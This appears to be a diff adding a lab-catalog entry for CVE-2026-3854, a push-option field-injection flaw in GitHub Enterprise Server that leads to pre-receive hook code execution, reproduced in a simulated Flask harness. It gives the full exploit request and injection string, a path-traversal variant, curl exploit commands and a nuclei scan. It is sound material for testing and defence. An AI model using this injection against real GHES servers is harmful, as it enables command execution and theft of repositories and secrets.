@@ -1,5 +1,81 @@
 [
   {
+    "id": "vt-2026-3854",
+    "info": {
+      "name": "GitHub Enterprise Server - X-Stat Field Injection to Pre-Receive Hook RCE",
+      "author": "omarkurt",
+      "description": "GitHub Enterprise Server versions up to and including 3.19.1 are affected\nby a remote code execution vulnerability (CVE-2026-3854) in the internal\ngit protocol. babeld copies git push-option values directly into the\ninternal X-Stat header without sanitizing ';', the header's field\ndelimiter. An authenticated user with push access can inject a single\npush option value containing extra fields (rails_env=development,\ncustom_hooks_dir, repo_pre_receive_hooks) that disable the pre-receive\nhook sandbox and redirect hook resolution to an attacker-controlled,\npath-traversed location, resulting in arbitrary command execution as the\ngit service user via a single `git push -o` command. GitHub.com was also\naffected and was patched within 6 hours of report. This package ships a\nsimulated HTTP lab: GHES is closed-source commercial software, so the\nreal babeld / pre-receive binaries cannot be obtained or redistributed.\nThe lab reproduces the exact vulnerable parsing and hook-resolution\nlogic described in the advisory over a small Flask harness.\n",
+      "type": "CVE",
+      "targets": [
+        "github-enterprise-server"
+      ],
+      "cve": "CVE-2026-3854",
+      "cwe": "CWE-74",
+      "cvss": {
+        "score": 8.7,
+        "severity": "critical",
+        "metrics": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
+      },
+      "affected_versions": [
+        "GitHub Enterprise Server <= 3.19.1"
+      ],
+      "fixed_version": "3.14.24 / 3.15.19 / 3.16.15 / 3.17.12 / 3.18.6 / 3.19.3",
+      "tags": [
+        "rce",
+        "github",
+        "ghes",
+        "authenticated",
+        "field-injection",
+        "pre-receive-hook",
+        "path-traversal",
+        "cve-2026",
+        "cve-2026-3854"
+      ],
+      "references": [
+        "https://www.wiz.io/blog/github-rce-vulnerability-cve-2026-3854",
+        "https://vulnerabletarget.com/VT-2026-3854"
+      ]
+    },
+    "vulnerabilities": [
+      {
+        "id": "x_stat_field_injection_rce",
+        "name": "X-Stat field injection via unsanitized push-option semicolon leads to pre-receive hook RCE",
+        "description": "The /internal/git-receive endpoint (simulating babeld's push-option\nhandling) concatenates each push-option value into the X-Stat header\nwithout escaping ';'. Because ';' is also the field delimiter, a\nsingle push-option value can smuggle additional fields. Setting\nrails_env=development disables the hook sandbox; custom_hooks_dir and\nrepo_pre_receive_hooks are then used, unvalidated, to resolve and\nexecute a hook script as the service user.\n",
+        "endpoint": "/internal/git-receive",
+        "method": "POST",
+        "param": "push_options",
+        "auth_required": true,
+        "request": "POST /internal/git-receive HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\nAuthorization: Bearer demo-user-push-token-123\n\n{\"push_options\":[\"id=abc123;rails_env=development;custom_hooks_dir=/tmp/evil;repo_pre_receive_hooks=pwn.sh\"],\"hook_payload\":\"IyEvYmluL3NoCmVjaG8gVlRfMjAyNl8zODU0X1BXTkVEXyQoaWQgLXUpXyQod2hvYW1pKQo=\"}\n",
+        "response": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"executed\":true,\"sandboxed\":false,\"resolved_hook_path\":\"/tmp/evil/pwn.sh\",\"output\":\"VT_2026_3854_PWNED_1500_gituser\\n\"}\n"
+      }
+    ],
+    "technical": "Vulnerable data flow (reproduced in app/app.py):\n\n1. build_x_stat(): \"user=demo;client=git/2.40.0\" plus, for every push\n   option, \";option=\" + value \u2014 the value is never checked for ';'.\n2. parse_fields(): splits the resulting string on ';' into key=value\n   pairs. An attacker's single push-option value such as\n   \"id=abc123;rails_env=development;custom_hooks_dir=/tmp/evil;\n   repo_pre_receive_hooks=pwn.sh\" therefore injects four extra fields\n   instead of the one intended.\n3. sandboxed = fields.get(\"rails_env\") != \"development\" \u2014 the injected\n   rails_env flips this to False, disabling the sandbox.\n4. hooks_dir defaults to /srv/hooks/safe, but when unsandboxed it is\n   replaced by the attacker-controlled custom_hooks_dir with no jail or\n   path canonicalization check (path traversal).\n5. hook_path = os.path.join(hooks_dir, hook_name) is written with the\n   attacker-supplied hook_payload and executed via `/bin/sh <hook_path>`\n   as the service account (gituser in the lab; the git service user on\n   real GHES).\n\nrepo_pre_receive_hooks carries its own path-traversal primitive\nindependent of custom_hooks_dir: rails_env=development plus\nrepo_pre_receive_hooks=../../../tmp/x.sh alone (no custom_hooks_dir at\nall) writes and executes the hook outside /srv/hooks/safe entirely,\nbecause hook_path is never canonicalized or jail-checked before use.\n\nAuthentication: the endpoint requires a valid push-access bearer token\n(Authorization: Bearer demo-user-push-token-123 in the lab), matching\nthe advisory's \"any authenticated user with push access\" prerequisite \u2014\nno elevated/admin privilege is needed.\n\nA single HTTP request (mirroring a single `git push -o ...`) is\nsufficient to go from field injection to command execution.\n\nSimulation fidelity (vs. the Wiz advisory):\nFaithfully reproduced: the root cause (push-option values copied into the\ninternal X-Stat header without escaping ';'), ';' acting as the field\ndelimiter and the resulting field injection, the three abused fields\n(rails_env=development disables the sandbox; custom_hooks_dir and\nrepo_pre_receive_hooks drive hook resolution), the \"authenticated user with\npush access\" prerequisite, a single request (one `git push -o`) being\nsufficient, and the published CVSS 8.7 / affected <= 3.19.1 / fixed-version\nset. Deliberately simplified, because GHES is closed-source and its binaries\ncannot be redistributed: the babeld -> gitrpcd trust chain is collapsed into a\nsingle Flask service; push options are labelled option=<value> rather than\npush_option_0/1...; the sandbox toggle keys on the exact advisory value\nrails_env=development; and repo_pre_receive_hooks writes-then-executes a hook\npayload instead of traversing to a pre-existing on-disk binary. The bug class\nand the end-to-end field-injection -> sandbox-bypass -> hook-RCE path are\nidentical.\n\nValidation (exercised live against this lab):\n- GET /                       -> banner \"GHES-sim internal relay ... build 3.19.1\"\n- POST with no / wrong token  -> 401 (a valid push credential is required)\n- Baseline, no ';' injection  -> sandboxed:true, executed:false; hook stays in /srv/hooks/safe\n- Field-injection exploit     -> sandboxed:false, executed:true; output \"VT_2026_3854_PWNED_1500_gituser\"\n- Path traversal on its own   -> repo_pre_receive_hooks=../../../tmp/x.sh resolves to /tmp/x.sh, escaping the safe dir\n- nuclei vt-2026-3854.nuclei.yaml -> critical match (2/2 requests)\n",
+    "impact": "An authenticated attacker with push access to any repository can execute\narbitrary commands as the git service user. On real GitHub Enterprise\nServer this yields access to all repositories and secrets on the\ninstance; on GitHub.com, access to repositories on the shared storage\nnode was possible before the 6-hour patch.\n",
+    "remedy": "- Upgrade GitHub Enterprise Server to 3.14.24, 3.15.19, 3.16.15, 3.17.12,\n  3.18.6, or 3.19.3 or later.\n- Sanitize or reject ';' and other delimiter characters in any value copied\n  into an internal protocol header.\n- Never let externally influenced fields (rails_env, custom_hooks_dir,\n  repo_pre_receive_hooks) control sandbox state or hook resolution paths.\n- Canonicalize and jail-check any filesystem path built from request-derived\n  input before executing it.\n",
+    "poc": {
+      "nuclei": [
+        "vt-2026-3854.nuclei.yaml"
+      ]
+    },
+    "providers": {
+      "docker-compose": {
+        "path": "docker-compose.yaml"
+      }
+    },
+    "post-install": [
+      "docker compose up -d",
+      "Wait for the healthcheck to pass (a few seconds)",
+      "Banner: curl http://localhost:8385/",
+      "Auth token (simulated push credential): demo-user-push-token-123 -- required on every /internal/git-receive call, else 401",
+      "Baseline (safe, no injection): curl -X POST http://localhost:8385/internal/git-receive -H 'Content-Type: application/json' -H 'Authorization: Bearer demo-user-push-token-123' -d '{\"push_options\":[\"id=abc123\"]}'",
+      "Exploit: curl -X POST http://localhost:8385/internal/git-receive -H 'Content-Type: application/json' -H 'Authorization: Bearer demo-user-push-token-123' -d '{\"push_options\":[\"id=abc123;rails_env=development;custom_hooks_dir=/tmp/evil;repo_pre_receive_hooks=pwn.sh\"],\"hook_payload\":\"IyEvYmluL3NoCmVjaG8gVlRfMjAyNl8zODU0X1BXTkVEXyQoaWQgLXUpXyQod2hvYW1pKQo=\"}'",
+      "Path traversal alone (no custom_hooks_dir): repo_pre_receive_hooks=../../../tmp/x.sh escapes /srv/hooks/safe entirely",
+      "nuclei -t vt-2026-3854.nuclei.yaml -u http://localhost:8385"
+    ],
+    "category": "cves",
+    "added_date": "2026-07-23T16:18:09+03:00"
+  },
+  {
     "id": "vt-2026-54433",
     "info": {
       "name": "Roundcube Webmail - Zero-Click Stored XSS in Plain-Text Rendering",
